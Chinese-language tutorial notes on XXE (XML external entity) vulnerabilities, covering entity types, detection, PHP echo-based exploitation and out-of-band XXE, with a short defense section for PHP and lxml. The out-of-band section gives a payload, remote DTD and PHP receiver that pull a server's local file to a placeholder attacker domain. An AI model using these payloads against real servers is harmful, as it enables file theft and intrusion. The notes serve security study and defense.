# XXE
*  [Entity](#entity)   
*  [Exploit](#exploit)   
*  [Defense](#defense)  
*  [Reference](#reference)   
   
XML是一種描述資料的語言，跟html很像，但著重於傳輸資料，Case-sensitive。  
```xml
<?xml version=“1.0” encoding=“utf-8”>    // xml的文檔聲明
<!DOCTYPE a[                    // DTD 文檔類型定義
    <!ENTITY .....>
]>
<a>     // 文檔元素
....
</a>
```
其中DTD的觀念以及利用尤為重要  
`XXE-SSRF`中有有回顯及無回顯的練習 

## Entity
在DTD中事先宣告才可以使用實體  
Entity就像定義變數一樣  
1. 內部實體： `<!ENTITY name "value">`  
```xml
<!DOCTYPE pwnch[
  <!ENTITY var "hi">
]>
<root>&var;</root>
```  

2. 外部實體： `<!ENTITY name SYSTEM "URL">`  
```xml
<!ENTITY var SYSTEM "url://.......txt">
<root>&var;</root>
```
新版本2.9.0後預設不解析外部實體  
所以可以用`print "libxml version: ".LIBXML_DOTTED_VERSION."\n";`確定一下  

3. 參數實體： `<!ENTITY %name "value>"`  
```xml
// exp.dtd: <!ENTITY next SYSTEM "file://.txt">
<!DOCTYPE pwnch[
  <!ENTITY %var SYSTEM "http://...../exp.dtd">
  %var;
]>
<root>&next;</root>
```
引入外部實體時將```exp.dtd```裡的參數給帶了進來  
> 順道提一下，```file:///``` 前兩條是protocol，最後一條是指根目錄

## Exploit
1. 檢測是否有XXE漏洞  
隨便輸入個xml判斷有沒有解析  
2. 有沒有支持DTD引用外部實體
```
<!DOCTYPE ANY [
<!ENTITY % name SYSTEM "url">
%name;
]>
```  
  
3. 有回顯 -> 簡單  
**php 與 XXE**  
```php
$xml = @new SimpleXMLElement($data);
echo $xml->node;
```
```SimpleXMLElement```會讓內容變成list的形式： ```[節點] => '內容'```  
最後一行的```$xml->node```則是取出名為**node**的節點  
因此exploit就會長成 ```<node>&var;</node>``` 這副德性  

4. 沒有回顯 -> 交給 OOB XXE  
那就讓server端主動傳資料給我們吧  
```xml
// 給server端吃的XML
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "你想要的東西">
<!ENTITY % remote SYSTEM "http://domain/xxe.dtd">
%remote;
%all;
%send;
]>
```
xxe.dtd  
```xml
<!ENTITY % all "<!ENTITY &#37; send SYSTEM 'http://domain/test.php?a=%file;'>">
```
test.php的內容  
```php
file_put_contents("test.txt",$_GET['a']);
```
整個流程：server端吃到我給的xml後，解析remote時會將我server上的dtd給引入。  
```xxe.dtd```上有all和send的參數實體，send在被解析時，就會對我server上的test.php發出請求。  
```test.php```會把我想要的資源放入```test.txt```的檔案。剩下的自己看著辦！  

## Defense
```php
// php 
libxml_disable_entity_loader(true);
// python
from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
```
以上的方式都可以禁止用戶引用外部實體，或者過濾使用者輸入的關鍵字  
[更詳細的內容可以參考這篇的漏洞修復與防禦](https://thief.one/2017/06/20/1/)

## Reference
* Kaibro's slides  
* [浅谈XXE漏洞攻击与防御](https://thief.one/2017/06/20/1/)
